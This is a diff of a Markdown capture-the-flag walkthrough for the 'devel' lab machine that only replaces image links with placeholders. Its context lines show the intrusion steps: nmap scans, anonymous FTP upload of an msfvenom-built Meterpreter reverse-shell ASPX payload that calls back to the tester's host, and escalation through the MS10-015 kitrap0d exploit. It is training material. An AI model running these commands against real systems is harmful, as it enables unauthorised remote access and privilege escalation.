@@ -25,9 +25,9 @@ export target=10.129.2.151
 sudo nmap -p- --min-rate 1000 -sT -vvv $target
 ```
 
-<img width="431" height="54" alt="image" src="https://github.com/user-attachments/assets/9e3642ea-d886-42c8-af4d-58aaaab08e76" />
+<img width="431" height="54" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
-<img width="791" height="541" alt="image" src="https://github.com/user-attachments/assets/964ec9a2-1472-46d4-97b5-d225e0177867" />
+<img width="791" height="541" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
 **Scan Results:**
 ```
@@ -42,7 +42,7 @@ Perform detailed service version detection and script scanning:
 sudo nmap -sC -sV -p 21,80 -T4 $target
 ```
 
-<img width="756" height="454" alt="image" src="https://github.com/user-attachments/assets/f5e070cd-6827-49be-882f-bf094c166761" />
+<img width="756" height="454" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 **Detailed Results:**
 ```
@@ -75,7 +75,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    - Default IIS7 page visible
    - TRACE method enabled (potential security risk)
 
-<img width="617" height="541" alt="image" src="https://github.com/user-attachments/assets/d8a916e6-2a8f-4f1e-9d84-022741f85a82" />
+<img width="617" height="541" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 ---
 
@@ -91,7 +91,7 @@ Name: anonymous
 Password: [any email or blank]
 ```
 
-<img width="573" height="314" alt="image" src="https://github.com/user-attachments/assets/700e620f-663a-47b4-b34e-f9751c7a83ad" />
+<img width="573" height="314" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
 **Directory Contents:**
 ```
@@ -108,14 +108,14 @@ Since FTP allows anonymous write access and the directory serves web content, we
 msfvenom -p windows/meterpreter/reverse_tcp -f aspx LHOST=10.10.14.106 LPORT=4444 > exploit.aspx
 ```
 
-<img width="809" height="135" alt="image" src="https://github.com/user-attachments/assets/e1068081-1544-48cb-b622-1c18b1dd257c" />
+<img width="809" height="135" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
 Upload the payload via FTP:
 ```bash
 ftp> put exploit.aspx
 ```
 
-<img width="942" height="130" alt="image" src="https://github.com/user-attachments/assets/60b6aa97-b74a-4dd4-a14d-471f74e365df" />
+<img width="942" height="130" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
 ### Reverse Shell Setup
 
@@ -137,7 +137,7 @@ run
 [*] Meterpreter session 7 opened (10.10.14.106:4444 -> 10.129.2.151:49158)
 ```
 
-<img width="841" height="389" alt="image" src="https://github.com/user-attachments/assets/4506956e-6c2a-49e4-b4e4-024cfdf943da" />
+<img width="841" height="389" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
 ### Initial Compromise Verification
 
@@ -146,7 +146,7 @@ meterpreter > getuid
 Server username: IIS APPPOOL\Web
 ```
 
-<img width="561" height="549" alt="image" src="https://github.com/user-attachments/assets/f71973b2-a1ba-4b99-8082-82f89d879fc3" />
+<img width="561" height="549" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
 ---
 
@@ -167,7 +167,7 @@ set SESSION 7
 run
 ```
 
-<img width="957" height="559" alt="image" src="https://github.com/user-attachments/assets/ab35e06a-0806-4e51-9028-466df59dd6b2" />
+<img width="957" height="559" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
 **Identified Vulnerabilities:**
 ```
@@ -178,7 +178,7 @@ run
 4. exploit/windows/local/ms10_015_kitrap0d
 ```
 
-<img width="954" height="205" alt="image" src="https://github.com/user-attachments/assets/e0a402ee-7eb8-4661-b5d3-ce73cf092597" />
+<img width="954" height="205" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
 ### Kernel Exploit (MS10-015)
 
@@ -204,7 +204,7 @@ run
 [*] Meterpreter session 2 opened (10.10.14.106:9009 -> 10.129.2.151:49178)
 ```
 
-<img width="838" height="868" alt="image" src="https://github.com/user-attachments/assets/5e7aa800-be01-46f7-86f5-04c3e966101d" />
+<img width="838" height="868" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />
 
 ### Privilege Verification
 
@@ -220,7 +220,7 @@ hostname
 devel
 ```
 
-<img width="515" height="384" alt="image" src="https://github.com/user-attachments/assets/71f77ee0-6aa8-43ef-8bce-aa26a07d3107" />
+<img width="515" height="384" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />
 
 ---
 
